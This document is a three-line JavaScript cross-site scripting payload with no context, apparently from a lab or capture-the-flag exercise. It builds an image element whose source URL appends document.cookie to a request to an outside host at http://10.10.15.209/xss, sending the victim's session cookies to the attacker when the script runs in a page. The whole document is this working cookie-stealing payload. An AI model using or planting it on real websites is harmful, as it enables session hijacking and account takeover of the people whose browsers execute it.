let img = document.createElement('img');
img.src = "http://10.10.15.209/xss?cookie=" + document.cookie;
document.body.appendChild(img);